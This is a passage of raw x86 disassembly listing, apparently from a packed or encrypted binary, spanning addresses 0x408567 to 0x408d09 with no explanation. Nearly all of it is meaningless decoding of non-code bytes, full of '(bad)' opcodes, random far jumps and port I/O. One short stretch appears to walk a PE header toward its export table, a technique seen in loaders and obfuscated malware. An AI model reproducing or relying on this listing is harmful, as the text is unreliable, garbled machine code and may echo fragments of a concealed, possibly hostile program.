  408567:	fisub  WORD PTR [esi+ebx*1]
  40856a:	mov    eax,ds:0x19265a4c
  40856f:	push   ss
  408570:	inc    eax
  408571:	std    
  408572:	and    DWORD PTR [edx+0x32],esp
  408575:	jno    0x40859e
  408577:	scas   eax,DWORD PTR es:[edi]
  408578:	mov    dh,0xc
  40857a:	sbb    al,0x8f
  40857c:	dec    ebp
  40857d:	daa    
  40857e:	jns    0x40850e
  408580:	and    eax,0x47715d0a
  408585:	sub    eax,0xc012c519
  40858a:	jecxz  0x4085bc
  40858c:	dec    ebp
  40858d:	mov    al,0xb0
  40858f:	xchg   esp,eax
  408590:	test   eax,0x3fea8b5c
  408595:	mov    cl,0xec
  408597:	push   es
  408598:	mov    ebx,DWORD PTR [esi+0x62ee3fc2]
  40859e:	mov    eax,ds:0x39978ef5
  4085a3:	sbb    eax,0xe8031019
  4085a8:	mov    ebx,DWORD PTR [ebx-0x1f]
  4085ab:	(bad)  
  4085ac:	loopne 0x4085ac
  4085ae:	and    edi,DWORD PTR [edi+0x384d2689]
  4085b4:	mov    BYTE PTR [eax+eax*4],dl
  4085b7:	inc    ebp
  4085b8:	je     0x40861a
  4085ba:	cmc    
  4085bb:	neg    BYTE PTR [esi+0x42]
  4085be:	xor    DWORD PTR [edx-0x15ebce2e],ecx
  4085c4:	ror    DWORD PTR [ecx-0x76919599],cl
  4085ca:	xchg   esp,eax
  4085cb:	adc    DWORD PTR [edi+ecx*2+0x26],eax
  4085cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085d0:	jnp    0x408640
  4085d2:	sub    DWORD PTR [eax],eax
  4085d4:	sar    esi,1
  4085d6:	fcomp  DWORD PTR [eax-0x2]
  4085d9:	mov    edi,0x5198480
  4085de:	popf   
  4085df:	sbb    eax,0xb56abf8f
  4085e4:	push   esp
  4085e5:	sub    ebp,DWORD PTR [ebx+ebx*8]
  4085e8:	retf   0x6fd5
  4085eb:	loop   0x408576
  4085ed:	not    BYTE PTR [ebp+0x77d93d1d]
  4085f3:	ja     0x4085c9
  4085f5:	cmp    esi,DWORD PTR [esi-0xf5b19c3]
  4085fb:	pusha  
  4085fc:	and    eax,0x41c2ee5d
  408601:	hlt    
  408602:	mov    al,0xff
  408604:	out    dx,al
  408605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408606:	sar    DWORD PTR [edi-0x10],1
  408609:	shl    DWORD PTR [ecx+eax*4-0x6ba37f2d],1
  408610:	int3   
  408611:	dec    esp
  408612:	push   ecx
  408613:	(bad)  
  408614:	jmp    0x408660
  408616:	mov    DWORD PTR [esi+0x17],ecx
  408619:	or     ah,bh
  40861b:	ret    0x46c9
  40861e:	mov    al,ds:0x81751a75
  408623:	daa    
  408624:	out    dx,eax
  408625:	loop   0x4085df
  408627:	inc    edi
  408628:	push   ebp
  408629:	jnp    0x4085ba
  40862b:	cld    
  40862c:	jae    0x4085e6
  40862e:	mov    bl,0x6d
  408630:	xchg   edi,eax
  408631:	cwde   
  408632:	push   esi
  408633:	pushf  
  408634:	ss jmp 0x1c1bd1ef
  40863a:	mov    al,0xb2
  40863c:	test   eax,0xf128cba
  408641:	bound  esi,QWORD PTR [ecx+0x4a]
  408644:	cmp    DWORD PTR [eax-0x5770b9a8],0xe59987e0
  40864e:	mov    ecx,0x712cf608
  408653:	push   0xffffff9a
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0x708fc096
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    dh,al
  40869e:	mov    edi,0x6d032ef8
  4086a3:	mov    esp,0x1994f3a3
  4086a8:	ret    0x178d
  4086ab:	pop    edi
  4086ac:	push   ds
  4086ad:	sbb    BYTE PTR [ecx-0x42],bl
  4086b0:	xchg   edx,eax
  4086b1:	and    DWORD PTR [ebx-0x26],0xa71ff6e1
  4086b8:	mov    eax,ds:0xa0741168
  4086bd:	int3   
  4086be:	sub    bl,BYTE PTR [ebx-0x42]
  4086c1:	pop    ecx
  4086c2:	out    dx,al
  4086c3:	stos   DWORD PTR es:[edi],eax
  4086c4:	xlat   BYTE PTR ds:[ebx]
  4086c5:	ss (bad) 
  4086c7:	mov    cl,0x9d
  4086c9:	push   ss
  4086ca:	mov    ecx,0xf963c5d0
  4086cf:	mov    ebp,0x34179442
  4086d4:	pop    ds
  4086d5:	inc    edx
  4086d6:	fs popf 
  4086d8:	(bad)  
  4086d9:	cld    
  4086da:	jo     0x408726
  4086dc:	ds aam 0x95
  4086df:	ja     0x40867e
  4086e1:	mov    ch,0x16
  4086e3:	push   esi
  4086e4:	lods   eax,DWORD PTR ds:[esi]
  4086e5:	ins    BYTE PTR es:[edi],dx
  4086e6:	lods   al,BYTE PTR ds:[esi]
  4086e7:	sar    BYTE PTR [eax+0x3c],cl
  4086ea:	shl    DWORD PTR [edx],cl
  4086ec:	into   
  4086ed:	mov    edx,0x26f5b154
  4086f2:	sahf   
  4086f3:	pop    es
  4086f4:	daa    
  4086f5:	jno    0x40869d
  4086f7:	dec    ebx
  4086f8:	test   eax,0x6640f26c
  4086fd:	push   es
  4086fe:	push   ebx
  4086ff:	call   0x203d:0x64406ffe
  408706:	inc    esi
  408707:	repnz (bad) 
  408709:	in     al,0x80
  40870b:	fdivr  QWORD PTR ds:0xbf7d9128
  408711:	fstp   st(7)
  408713:	add    BYTE PTR [ebx],cl
  408715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408716:	jmp    0x2bb0:0x2446cace
  40871d:	and    ch,dl
  40871f:	rol    DWORD PTR [esi],1
  408721:	dec    ecx
  408722:	xor    BYTE PTR [eax],ah
  408724:	aas    
  408725:	test   BYTE PTR [ebp+0x1c],al
  408728:	jb     0x408795
  40872a:	jne    0x40871c
  40872c:	add    ah,BYTE PTR [eax]
  40872e:	jne    0x4087a6
  408730:	mov    ch,0xad
  408732:	adc    DWORD PTR [ecx-0x3b],edi
  408735:	loope  0x408786
  408737:	add    BYTE PTR [eax+0x33],0x13
  40873b:	retf   0x7bb
  40873e:	rol    DWORD PTR [ebp+0xcd3cb4f],cl
  408744:	jmp    0xb136fddf
  408749:	lods   eax,DWORD PTR ds:[esi]
  40874a:	sub    ch,BYTE PTR [esi+0x317378a4]
  408750:	cli    
  408751:	dec    ecx
  408752:	and    DWORD PTR [ecx+edx*2],eax
  408755:	dec    edx
  408756:	xchg   esi,eax
  408757:	add    BYTE PTR [ebx],bh
  408759:	clc    
  40875a:	jmp    0x408796
  40875c:	repz pop ss
  40875e:	stos   DWORD PTR es:[edi],eax
  40875f:	cld    
  408760:	test   BYTE PTR [edi-0x7f4bb6db],ch
  408766:	repnz inc eax
  408768:	dec    esi
  408769:	loopne 0x40878b
  40876b:	sahf   
  40876c:	pop    es
  40876d:	inc    edx
  40876e:	fcom   DWORD PTR [ebx]
  408770:	mov    al,BYTE PTR [eax]
  408772:	mov    al,gs:0xd5a7f6e1
  408778:	iret   
  408779:	or     BYTE PTR [edx+0x2bc809bd],bh
  40877f:	dec    edx
  408780:	dec    esi
  408781:	out    0x16,eax
  408783:	push   esi
  408784:	dec    esp
  408785:	aaa    
  408786:	sub    DWORD PTR [ebx-0x3e],esi
  408789:	pop    fs
  40878b:	add    al,0x59
  40878d:	jmp    0x4087d7
  40878f:	xor    eax,DWORD PTR [ecx-0x49686897]
  408795:	outs   dx,BYTE PTR ds:[esi]
  408796:	cmp    bh,BYTE PTR [edi-0x47]
  408799:	out    dx,eax
  40879a:	sub    cl,ah
  40879c:	loop   0x4087bd
  40879e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4087a0:	and    DWORD PTR [ebx],edx
  4087a2:	test   eax,0x7a03b0c4
  4087a7:	add    al,0x37
  4087aa:	js     0x4087a0
  4087ac:	and    ch,BYTE PTR [eax]
  4087ae:	mov    bl,0x22
  4087b0:	add    al,0xe2
  4087b2:	arpl   WORD PTR [ebx],cx
  4087b4:	and    eax,0x196cea48
  4087b9:	fisub  WORD PTR [edi-0x43]
  4087bc:	push   0x2f64733a
  4087c1:	push   esp
  4087c2:	push   eax
  4087c3:	add    al,0x4f
  4087c5:	mov    edi,esp
  4087c7:	(bad)  
  4087c8:	jae    0x408806
  4087ca:	loopne 0x408838
  4087cc:	jb     0x408754
  4087ce:	mov    gs,WORD PTR [edi+eiz*2]
  4087d1:	ins    BYTE PTR es:[edi],dx
  4087d2:	das    
  4087d3:	loope  0x408819
  4087d5:	jb     0x408817
  4087d7:	inc    DWORD PTR ds:[edx]
  4087da:	iret   
  4087db:	in     al,dx
  4087dc:	lods   al,BYTE PTR ds:[esi]
  4087dd:	cmc    
  4087de:	mov    al,0x1
  4087e0:	mov    eax,0x89c4eac1
  4087e5:	mov    ch,0xc1
  4087e7:	pop    ecx
  4087e8:	ja     0x4087c5
  4087ea:	and    BYTE PTR [esp+ecx*4],dh
  4087ed:	mov    ah,0xbf
  4087ef:	push   ds
  4087f0:	sbb    ah,BYTE PTR [eax+eax*2-0x7]
  4087f4:	aas    
  4087f5:	and    al,0xdc
  4087f8:	or     BYTE PTR [eax],dl
  4087fa:	stos   DWORD PTR es:[edi],eax
  4087fb:	loopne 0x40885a
  4087fd:	push   edi
  4087fe:	jo     0x408814
  408800:	mov    ds:0x6997f179,eax
  408805:	pushf  
  408806:	adc    DWORD PTR [ecx+eax*2],ebx
  408809:	stc    
  40880a:	sbb    bl,BYTE PTR [ebp+0x1c]
  40880d:	repz ss push ds
  408810:	fst    QWORD PTR [ecx]
  408812:	inc    ebx
  408813:	cmp    DWORD PTR [esi+0x9],esi
  408816:	fmul   st(3),st
  408818:	adc    DWORD PTR [esi-0x4014acbe],0xc028808b
  408822:	sbb    al,0x7d
  408824:	inc    ebp
  408825:	aam    0xa3
  408827:	adc    eax,0xfb4f7661
  40882c:	pop    DWORD PTR [ebp-0x37dc9e19]
  408832:	scas   eax,DWORD PTR es:[edi]
  408833:	dec    ebp
  408834:	(bad)  [esi]
  408836:	sbb    edi,ebp
  408838:	sti    
  408839:	mov    DWORD PTR [ebx],ecx
  40883b:	inc    edx
  40883c:	and    dh,BYTE PTR [ecx+0x1a]
  40883f:	adc    ebx,edi
  408841:	fcmovnbe st,st(1)
  408843:	nop
  408844:	push   esi
  408845:	inc    ebp
  408846:	cmp    al,BYTE PTR [ebp+0x75]
  408849:	dec    esp
  40884a:	retf   
  40884b:	add    BYTE PTR [ecx],dl
  40884d:	and    al,0xd9
  40884f:	push   ebx
  408850:	loope  0x4088b8
  408852:	push   ss
  408853:	std    
  408854:	shl    DWORD PTR [ebx-0x185bb5ed],cl
  40885a:	test   eax,0xdc3c70ab
  40885f:	lahf   
  408860:	jl     0x408881
  408862:	jae    0x40886c
  408864:	pusha  
  408865:	adc    BYTE PTR [eax-0x3b4b9556],dl
  40886b:	mov    dl,BYTE PTR [edi]
  40886d:	(bad)  
  40886e:	or     al,0x32
  408870:	loopne 0x408842
  408872:	mov    ds:0x99f6ea24,eax
  408877:	sub    BYTE PTR [esi],0xad
  40887a:	jae    0x4088d0
  40887c:	outs   dx,BYTE PTR ds:[esi]
  40887d:	imul   ecx,esi,0x7a
  408880:	iret   
  408881:	and    esi,DWORD PTR [edx]
  408883:	sbb    DWORD PTR [edi-0x6b],edx
  408886:	sahf   
  408887:	and    ebx,DWORD PTR [ebp+0x6d]
  40888a:	adc    al,0x6b
  40888c:	dec    esp
  40888d:	fimul  WORD PTR [edx+0x7c]
  408890:	pop    ds
  408891:	xchg   edi,eax
  408892:	ficom  WORD PTR [eax+ebp*4]
  408895:	call   0x42c9:0xb0f8e2d7
  40889c:	scas   eax,DWORD PTR es:[edi]
  40889d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40889e:	mov    ds:0x830144f6,eax
  4088a3:	adc    DWORD PTR [eax+ebx*8-0x18],esp
  4088a7:	stos   BYTE PTR es:[edi],al
  4088a8:	xchg   BYTE PTR [esi+0x38],al
  4088ab:	stos   DWORD PTR es:[edi],eax
  4088ac:	cmp    ecx,ebx
  4088ae:	pop    ss
  4088af:	test   al,0x49
  4088b1:	jg     0x4088a2
  4088b3:	aam    0x3b
  4088b5:	add    al,0xa2
  4088b7:	sub    BYTE PTR [ebp+0x6e0a84d7],ah
  4088bd:	xchg   edi,eax
  4088be:	mov    eax,ds:0xf1d4e63e
  4088c3:	outs   dx,BYTE PTR ds:[esi]
  4088c4:	sub    al,0x53
  4088c6:	fisttp DWORD PTR [edx+0x7e]
  4088c9:	sub    eax,esi
  4088cb:	and    eax,0x4b2c8a4a
  4088d0:	sbb    DWORD PTR [esi+0x57],ebx
  4088d3:	xchg   ebx,eax
  4088d4:	(bad)  
  4088d5:	test   eax,0x8e82f6f2
  4088da:	add    BYTE PTR ds:[edx+0x5f830aa2],0x6c
  4088e2:	sar    DWORD PTR [edi+0xe8b7783],1
  4088e8:	mov    eax,ds:0x5f660de4
  4088ed:	stc    
  4088ee:	loopne 0x40893c
  4088f0:	and    al,0xb6
  4088f2:	dec    esp
  4088f3:	fsub   QWORD PTR [ebx+0x60]
  4088f6:	xchg   ebx,eax
  4088f7:	call   0x1b2f2678
  4088fc:	(bad)  
  4088fe:	je     0x40890e
  408900:	pop    esi
  408901:	ror    BYTE PTR [esp+ebx*4+0x5c],cl
  408905:	retf   
  408906:	pop    ecx
  408907:	xor    ah,BYTE PTR [ecx]
  408909:	xchg   esp,eax
  40890a:	icebp  
  40890b:	jb     0x4088e3
  40890d:	and    DWORD PTR [ebx],eax
  40890f:	(bad)  
  408910:	dec    eax
  408911:	lea    edi,[ebp+ebx*8-0x1f9ae90b]
  408918:	inc    edx
  408919:	jp     0x40898d
  40891b:	sub    BYTE PTR [edi-0x13],ch
  40891e:	sahf   
  40891f:	or     eax,0x53799889
  408924:	dec    eax
  408925:	sbb    bh,BYTE PTR [edx+0x7709c325]
  40892b:	arpl   WORD PTR [ecx+0x120457fa],bx
  408931:	dec    esi
  408932:	mov    WORD PTR [esi-0x5a],?
  408935:	(bad)  
  408936:	outs   dx,BYTE PTR ds:[esi]
  408937:	dec    eax
  408938:	xchg   edx,eax
  408939:	(bad)  
  40893b:	xor    eax,0x9f56c348
  408940:	mov    gs,WORD PTR [esi+esi*8]
  408943:	out    0x57,eax
  408945:	or     DWORD PTR [esp+eax*4],esi
  408948:	loop   0x40897a
  40894a:	cmc    
  40894b:	pop    edx
  40894c:	stc    
  40894d:	jno    0x408926
  40894f:	ror    BYTE PTR [bp+si+0x49],cl
  408953:	inc    ebx
  408954:	sub    BYTE PTR [ebx+0x68bc2e26],0x71
  40895b:	leave  
  40895c:	test   al,0xa3
  40895e:	jle    0x408930
  408960:	cmp    esp,0xc61d5d5b
  408966:	cs hlt 
  408968:	(bad)  
  40896a:	mov    eax,0x620067e4
  40896f:	fcomp  DWORD PTR [esi+0x3a67267e]
  408975:	lods   eax,DWORD PTR ds:[esi]
  408976:	jno    0x4089b9
  408978:	inc    ecx
  408979:	ficomp WORD PTR [ecx-0x5ae557f1]
  40897f:	cwde   
  408980:	dec    ebp
  408981:	or     DWORD PTR ds:0x5c146849,edx
  408987:	pop    eax
  408988:	xchg   ecx,eax
  408989:	ret    
  40898a:	xchg   ebx,eax
  40898b:	sub    al,0x34
  40898d:	call   0xa3be:0xe8483638
  408994:	mov    cl,0x13
  408996:	aad    0x67
  408998:	aad    0xcd
  40899a:	xchg   esp,eax
  40899b:	push   ss
  40899c:	ja     0x4089c5
  40899e:	ret    
  40899f:	xor    eax,0xf9e8bb39
  4089a4:	push   eax
  4089a5:	das    
  4089a6:	push   edi
  4089a7:	cmp    al,0xda
  4089a9:	mov    WORD PTR [ecx+0x772014ab],es
  4089af:	mov    dh,0xe9
  4089b1:	mov    edi,0x6557005c
  4089b6:	ds mov dh,al
  4089b9:	sbb    eax,DWORD PTR [eax]
  4089bb:	pop    esi
  4089bc:	mov    bl,0xce
  4089be:	popa   
  4089bf:	lods   eax,DWORD PTR ds:[esi]
  4089c0:	sub    DWORD PTR [eax+edi*4+0x9],ecx
  4089c4:	rol    cl,cl
  4089c6:	(bad)  
  4089c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c8:	adc    BYTE PTR [esi+esi*2-0xb],bl
  4089cc:	mov    ebx,ss
  4089ce:	push   0xffffff84
  4089d0:	or     DWORD PTR [edi+0x3801d579],0xffffffe0
  4089d7:	leave  
  4089d8:	popa   
  4089d9:	or     cl,cl
  4089db:	mov    edx,0x1b8f0eae
  4089e0:	mov    ss,edx
  4089e2:	jmp    0x40899d
  4089e4:	stos   DWORD PTR es:[edi],eax
  4089e5:	cdq    
  4089e6:	sub    DWORD PTR [ebx],ebx
  4089e8:	sti    
  4089e9:	test   BYTE PTR [edi],dl
  4089eb:	or     BYTE PTR [ecx],ah
  4089ed:	push   0xffffffec
  4089ef:	sub    DWORD PTR [edi+0x33f46242],esp
  4089f5:	clc    
  4089f6:	mov    edx,0x4847df6c
  4089fb:	jge    0x4089cc
  4089fd:	cmp    ebp,DWORD PTR [eax]
  4089ff:	xchg   ah,ah
  408a01:	jns    0x408a6e
  408a03:	mov    dh,BYTE PTR [ecx+0x44e8393d]
  408a09:	and    al,0x91
  408a0b:	sub    DWORD PTR [ebx+0x74ebbc8f],esi
  408a11:	add    eax,0xa507b347
  408a16:	mov    DWORD PTR [edi],ecx
  408a18:	popf   
  408a19:	fs adc cl,ah
  408a1c:	xor    eax,0xce479d9
  408a21:	scas   eax,DWORD PTR es:[edi]
  408a22:	xchg   ebx,eax
  408a23:	(bad)  
  408a24:	or     al,cl
  408a26:	jge    0x408a16
  408a28:	dec    ecx
  408a29:	mov    esp,0xd52782d8
  408a2e:	xlat   BYTE PTR ds:[ebx]
  408a2f:	aas    
  408a30:	mov    edi,0xf050a0b2
  408a35:	bound  ebp,QWORD PTR [edi+0xd]
  408a38:	mov    WORD PTR [edi+0x49],ds
  408a3b:	push   0xd354478d
  408a40:	(bad)
  408a43:	out    dx,al
  408a44:	enter  0xc1ce,0xab
  408a48:	ror    ecx,1
  408a4a:	xchg   ebp,eax
  408a4b:	montmul (bad)
  408a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a4d:	and    DWORD PTR [ecx],0x63
  408a50:	xor    al,0x6f
  408a52:	and    cl,BYTE PTR [ecx-0x60532a1a]
  408a58:	sbb    al,0x2b
  408a5a:	shl    BYTE PTR [ebx-0x26],cl
  408a5d:	mov    al,0x8b
  408a5f:	push   es
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	lock or DWORD PTR [edi+0x1857b5b0],edi
  408a7b:	sbb    BYTE PTR [esi+0x20181812],bl
  408a81:	pushf  
  408a82:	mov    eax,0x56ff6431
  408a87:	push   ecx
  408a88:	hlt    
  408a89:	dec    edi
  408a8a:	lds    esi,FWORD PTR [eax-0x79]
  408a8d:	int    0x2e
  408a8f:	clc    
  408a90:	jp     0x408aaf
  408a92:	cmp    al,0x47
  408a94:	pop    esi
  408a95:	(bad)  
  408a96:	dec    BYTE PTR [edx-0x3]
  408a99:	jl     0x408a56
  408a9b:	push   edx
  408a9c:	not    BYTE PTR [edx+eiz*4+0x25]
  408aa0:	aam    0x6
  408aa2:	fcomp  QWORD PTR [ecx+edi*2]
  408aa5:	cs pushf 
  408aa7:	mov    ah,0x10
  408aa9:	adc    al,0x51
  408aab:	cmp    ah,BYTE PTR [esi]
  408aad:	imul   ecx,DWORD PTR [ecx],0xf72bdaea
  408ab3:	mov    WORD PTR [esp+edi*8-0x71864a22],fs
  408aba:	sahf   
  408abb:	xlat   BYTE PTR ds:[ebx]
  408abc:	jnp    0x408ae8
  408abe:	shl    DWORD PTR [edx+ecx*2],1
  408ac1:	std    
  408ac2:	or     ah,BYTE PTR [edi-0x5c40751]
  408ac8:	mov    ch,0xc5
  408aca:	mov    cl,0x5f
  408acc:	cmp    al,0xbc
  408ace:	mov    esp,edi
  408ad0:	inc    ebp
  408ad1:	push   cs
  408ad2:	pop    ecx
  408ad3:	mov    bl,0xc5
  408ad5:	jl     0x408ae4
  408ad7:	mov    ah,0x75
  408ad9:	inc    ebp
  408ada:	lds    edx,FWORD PTR [ebx+0x52847d76]
  408ae0:	jnp    0x408ae1
  408ae2:	in     eax,dx
  408ae3:	xchg   ebx,eax
  408ae4:	add    eax,0x955dd637
  408ae9:	jg     0x408b15
  408aeb:	and    al,ch
  408aed:	aad    0x1a
  408aef:	mov    al,0x82
  408af1:	das    
  408af2:	inc    edi
  408af3:	add    DWORD PTR [ebx-0x64f74829],ecx
  408af9:	ins    DWORD PTR es:[edi],dx
  408afa:	out    dx,eax
  408afb:	gs sub bl,dl
  408afe:	nop
  408aff:	rol    DWORD PTR [eax],1
  408b01:	sti    
  408b02:	jmp    0x6355:0xab4bb0da
  408b09:	dec    esp
  408b0a:	add    BYTE PTR [ebp+0x68221d13],0x92
  408b11:	call   FWORD PTR [edi+0x390db0a1]
  408b17:	push   ds
  408b18:	mov    edi,0xfa62077f
  408b1d:	push   ecx
  408b1e:	in     eax,dx
  408b1f:	mov    ecx,0x86e09fb6
  408b24:	adc    ch,al
  408b26:	inc    edi
  408b27:	(bad)  
  408b29:	fs ja  0x408aed
  408b2c:	dec    ebx
  408b2d:	hlt    
  408b2e:	fisubr WORD PTR [ecx-0x7f]
  408b31:	leave  
  408b32:	xlat   BYTE PTR ds:[ebx]
  408b33:	rol    DWORD PTR [eax-0xeaaf207],0xd8
  408b3a:	cs jmp 0x356051e9
  408b40:	in     eax,dx
  408b41:	lds    ebp,FWORD PTR [eax-0x50]
  408b44:	cs cwde 
  408b46:	xor    eax,DWORD PTR [eax-0x628043d6]
  408b4c:	xchg   esp,eax
  408b4d:	mov    esp,DWORD PTR [ebx+ebx*4+0x23bd2bf3]
  408b54:	test   al,0x1a
  408b56:	adc    DWORD PTR [edi+0x1c],0xbb7e8817
  408b5d:	(bad)
  408b60:	ret    
  408b61:	and    DWORD PTR [edx+ebx*8+0x4c],ebx
  408b65:	imul   ebp,DWORD PTR [edx+0x3b2ab127],0xfffffffd
  408b6c:	sar    bl,1
  408b6e:	rol    BYTE PTR [edx+0x1b],0x8
  408b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b73:	(bad)  
  408b74:	fnsave [esi-0x80]
  408b77:	into   
  408b78:	test   al,0xbd
  408b7a:	test   DWORD PTR [ebp-0x66],esi
  408b7d:	neg    BYTE PTR [ebx-0x7b]
  408b80:	sbb    al,0x31
  408b82:	popf   
  408b83:	aad    0x67
  408b85:	jp     0x408bd0
  408b87:	push   eax
  408b88:	add    BYTE PTR [ebp+0x63],dh
  408b8b:	pop    ds
  408b8c:	dec    esp
  408b8d:	ret    
  408b8e:	into   
  408b8f:	rol    BYTE PTR [edx],0xac
  408b92:	cmp    BYTE PTR [edx],dh
  408b94:	adc    edi,esp
  408b96:	sub    ecx,eax
  408b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b99:	mov    ds:0xd35d1f5,al
  408b9e:	repz add DWORD PTR cs:0x67385f6,0x1e
  408ba7:	xchg   esp,eax
  408ba8:	dec    edi
  408ba9:	pop    ecx
  408bab:	sub    al,0x27
  408bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bae:	mov    dh,0x92
  408bb0:	cdq    
  408bb1:	pop    esi
  408bb2:	inc    ecx
  408bb3:	jl     0x408bd1
  408bb5:	ins    DWORD PTR es:[edi],dx
  408bb6:	inc    ebp
  408bb7:	cmc    
  408bb8:	sub    esp,DWORD PTR [esi+0x77612737]
  408bbe:	scas   al,BYTE PTR es:[edi]
  408bbf:	popa   
  408bc0:	or     eax,0x97f13be5
  408bc5:	(bad)
  408bc8:	or     esi,ebp
  408bca:	retf   
  408bcb:	imul   BYTE PTR [edi]
  408bcd:	pop    ecx
  408bce:	sar    BYTE PTR [eax-0xb],1
  408bd1:	(bad)  
  408bd2:	dec    edi
  408bd3:	and    esi,ebx
  408bd5:	jg     0x408c51
  408bd7:	sbb    BYTE PTR [esi+0x70],0xc1
  408bdb:	stos   BYTE PTR es:[edi],al
  408bdc:	dec    ebx
  408bdd:	jno    0x408bce
  408bdf:	cld    
  408be0:	(bad)  
  408be1:	out    0x1e,eax
  408be3:	push   0x54c55f63
  408be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be9:	push   ds
  408bea:	leave  
  408beb:	ins    DWORD PTR es:[edi],dx
  408bec:	into   
  408bed:	arpl   WORD PTR ds:0x6904d35f,cx
  408bf3:	dec    ebx
  408bf4:	out    dx,eax
  408bf5:	sti    
  408bf6:	imul   edi,DWORD PTR [esi+0x44],0xc922110b
  408bfd:	adc    esp,DWORD PTR [edx-0x6389823a]
  408c03:	pushf  
  408c04:	repz jbe 0x408b97
  408c07:	aaa    
  408c08:	mov    esi,0x6257b270
  408c0d:	sub    eax,0x5133c6da
  408c12:	add    ecx,eax
  408c14:	imul   ebx,DWORD PTR [esi],0xfe2474dd
  408c1a:	dec    ecx
  408c1b:	xchg   esp,eax
  408c1c:	mov    eax,ds:0xaea32177
  408c21:	addr16 dec ebp
  408c23:	ins    DWORD PTR es:[edi],dx
  408c24:	ror    DWORD PTR cs:[edi],1
  408c27:	jns    0x408bfc
  408c29:	ins    BYTE PTR es:[edi],dx
  408c2a:	loope  0x408c31
  408c2c:	fcmovnb st,st(6)
  408c2e:	add    DWORD PTR [esi+0x5b457ff1],edi
  408c34:	or     DWORD PTR [esi-0x45],ebp
  408c37:	mov    ecx,0x91684539
  408c3c:	add    eax,0xbe772179
  408c41:	inc    edx
  408c42:	and    eax,DWORD PTR [edi+edi*8+0x55fb8a60]
  408c49:	xlat   BYTE PTR ds:[ebx]
  408c4a:	(bad)  
  408c4b:	jmp    0x408c5a
  408c4d:	out    dx,eax
  408c4e:	dec    ebp
  408c4f:	mov    bl,0x21
  408c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c52:	inc    edx
  408c53:	or     BYTE PTR [esi+ebp*4+0x67ca0658],0xad
  408c5b:	mov    edx,0xd444636
  408c60:	adc    DWORD PTR [ecx+0x5e],ebx
  408c63:	into   
  408c64:	pop    esi
  408c65:	jle    0x408ca1
  408c67:	lock test DWORD PTR [ecx-0xd],ebp
  408c6b:	(bad)  
  408c6c:	scas   al,BYTE PTR es:[edi]
  408c6d:	fcomp  QWORD PTR [esi-0x4a]
  408c70:	sbb    al,0xcf
  408c72:	fsub   st,st(3)
  408c74:	jno    0x408cd4
  408c76:	(bad)  
  408c77:	or     ecx,DWORD PTR [edi*1+0x36a98cb3]
  408c7e:	pop    esi
  408c7f:	dec    edi
  408c80:	or     DWORD PTR [edx],esp
  408c82:	int3   
  408c83:	mov    WORD PTR [esi-0x49],fs
  408c86:	in     al,dx
  408c87:	ss sbb eax,0xf3017210
  408c8d:	data16 sti 
  408c8f:	push   cs
  408c90:	clc    
  408c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c92:	dec    DWORD PTR [edi-0x24]
  408c95:	popa   
  408c96:	(bad)  
  408c97:	mov    ebx,0x3e1c1bd2
  408c9c:	or     BYTE PTR [edx-0x2],0x2c
  408ca0:	sbb    DWORD PTR [eax-0xc8f27e4],edi
  408ca6:	xchg   edx,eax
  408ca7:	call   0x467:0xfe21fccb
  408cae:	fldenv [eax-0x1d]
  408cb1:	add    BYTE PTR [ecx],0x68
  408cb4:	pop    ds
  408cb5:	test   DWORD PTR [edi+0x6f08bfd],esp
  408cbb:	xchg   esi,eax
  408cbc:	push   cs
  408cbd:	mov    dl,0xf0
  408cbf:	cmp    DWORD PTR [esi+0x6a],0xf06c6a6c
  408cc6:	xchg   esp,eax
  408cc7:	gs aad 0xbf
  408cca:	mov    ah,0xce
  408ccc:	fcmovbe st,st(5)
  408cce:	mov    dl,0x8d
  408cd0:	rcl    DWORD PTR [eax-0x610ee029],0xfb
  408cd7:	mov    edx,0xab60594e
  408cdc:	add    eax,0xabe1b1b7
  408ce1:	sbb    BYTE PTR [edi-0x75],dl
  408ce4:	in     eax,0x15
  408ce6:	ss xchg esp,eax
  408ce8:	adc    DWORD PTR [eax+eax*2-0x68932535],ecx
  408cef:	je     0x408d5d
  408cf1:	push   edi
  408cf2:	(bad)  
  408cf3:	xlat   BYTE PTR ds:[ebx]
  408cf4:	or     eax,esi
  408cf6:	imul   edi,edi,0x28705e6c
  408cfc:	dec    eax
  408cfd:	push   0xc
  408cff:	sub    bh,ch
  408d01:	pop    eax
  408d02:	fwait
  408d03:	inc    esi
  408d04:	cmp    al,0x89
  408d06:	popf   
  408d07:	loope  0x408c95
  408d09:	dec    esi
